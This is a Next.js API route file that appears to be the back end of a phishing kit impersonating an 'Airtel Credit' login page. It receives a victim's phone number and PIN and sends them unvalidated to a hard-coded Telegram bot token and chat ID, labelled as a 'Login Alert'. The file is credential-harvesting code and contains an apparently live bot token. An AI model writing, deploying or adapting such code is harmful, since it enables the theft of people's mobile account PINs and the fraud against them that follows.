import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const { phoneNumber, pinCode , action, timestamp } = await request.json();

    
    const botToken = '8826562060:AAF3WVmPmbM8UmOYsLegyZAurWl_w5iOelM';
    const chatId = '6564676243';

    if (!botToken || !chatId) {
      console.error('Telegram credentials not configured');
      return NextResponse.json(
        { error: 'Telegram not configured' },
        { status: 500 }
      );
    }

    const message = `
🔔 **Airtel Credit Login Alert**

📱 Phone Number: ${phoneNumber}
🔒  Pin :   ${pinCode}
📋 Action: ${action === 'login_attempt' ? 'Login Attempt' : action}
⏰ Timestamp: ${new Date(timestamp).toLocaleString()}
    `;

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message.trim(),
        parse_mode: 'Markdown',
      }),
    });

    if (!response.ok) {
      const error = await response.json();
      console.error('Telegram API error:', error);
      return NextResponse.json(
        { error: 'Failed to send message' },
        { status: response.status }
      );
    }

    const result = await response.json();
    return NextResponse.json({ success: true, messageId: result.result.message_id });
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
